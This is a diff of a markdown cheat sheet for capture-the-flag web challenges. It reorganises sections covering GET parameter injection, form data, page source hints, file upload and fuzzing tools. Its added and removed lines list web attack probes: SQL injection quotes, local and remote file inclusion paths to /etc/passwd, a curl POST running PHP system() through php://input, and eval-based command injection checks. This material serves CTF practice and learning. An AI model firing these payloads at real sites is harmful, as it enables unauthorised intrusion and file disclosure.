@@ -4,34 +4,40 @@
 Web challenges can often by tricky. Sometimes you have no clue what to do.
 A good recommendation is try to find stuff that is out of the ordinary.
 
-A good clue where to start is to look out for:
-* GET parameters.
-    `?page=index`
+#### Useful tools to begin with
 
-    Here you have to manually try to enter some stuff to understand more about the application.
-    * `?id='`
-            Test for SQL injection
-    * `?page[]=`
-            Send an array, this might crash or reveal debug information about the error. Sometimes you might even get the source code of the application.
-    * `?id=-1`
-            Try negative numbers
-    * `?page=../../../../etc/passwd`
-            Local file inclusion (LFI)
-    * `?page=../html/index`
-            If you the above line does not work. Try this as you could be dealing with a limited local file inclusion.
-        The code could look like this in php:
-        ```php
-        <?php
-            include $_GET['page'] . '.php';
-        ```
-    * `?page=http://remote-file.js`
-            Remote file inclusion
+* ZAP
+* Burpsuite
+* Python with requests lib
 
-    * `?page=%252e%252e%252fetc%252fpasswd`
-            Double encoding + LFI
 
-    * `$ curl -d "<?=system('ls .')" -X POST http://URL/?magic=php://input`
-            Send a arbitrary payload through a post request
+##### Injection in GET parameter
+Here you have to manually try to enter some stuff to understand more about the application.
+* `?id='`
+        Test for SQL injection
+* `?page[]=`
+        Send an array, this might crash or reveal debug information about the error. Sometimes you might even get the source code of the application.
+* `?id=-1`
+        Try negative numbers
+* `?page=../../../../etc/passwd`
+        Local file inclusion (LFI)
+* `?page=../html/index`
+        If you the above line does not work. Try this as you could be dealing with a limited local file inclusion.
+    The code could look like this in php:
+    ```php
+    <?php
+        include $_GET['page'] . '.php';
+    ```
+* `?page=http://remote-file.js`
+        Remote file inclusion
+
+* `?page=%252e%252e%252fetc%252fpasswd`
+        Double encoding + LFI
+
+* `$ curl -d "<?=system('ls .')" -X POST http://URL/?magic=php://input`
+        Send a arbitrary payload through a post request
+
+### Form data
 
 * Hidden form input
     ```html
@@ -41,8 +47,11 @@ A good clue where to start is to look out for:
     * `?exec=5*5`
             If it returns `25` we have  `command injection`.
             Backend is probably running :
-            
+
             eval($_GET['exec'])`
+
+### Page source
+The source of the page often includes hints where to look.
 
 * Commented out links
     ```html
@@ -52,6 +61,8 @@ A good clue where to start is to look out for:
     ```
     <!-- debug -->
     ```
+
+##### Attack functionality
 * [File upload](https://www.owasp.org/index.php/Unrestricted_File_Upload)
     * Try a lot of different extensions'
     * Double extension `.png.php`
@@ -63,6 +74,8 @@ A good clue where to start is to look out for:
 
 * Money transfer
         These are often a `timing attack`
+
+##### Other
 
 * Clues in the name/title of the challenges
 
@@ -84,8 +97,7 @@ A good clue where to start is to look out for:
 * Apache/nginx version?
 
 * Nullbyte
-
-    PHP Version < 5.3.4
+        PHP Version < 5.3.4
 
 * LFI / RFI (PHP Wrappers)
         I recommend this page from [rawsec](https://rawsec.ml/en/local-file-inclusion-remote-code-execution-vulnerability/)
@@ -101,13 +113,6 @@ Use your favorite `fuzzer`. Here are some good ones:
 * dirb
 
 * dirbuster
-
-
-## Useful tools for web
-
-* ZAP
-* Burpsuite
-
 
 
 ## Esoteric Languages (ESO Lang)
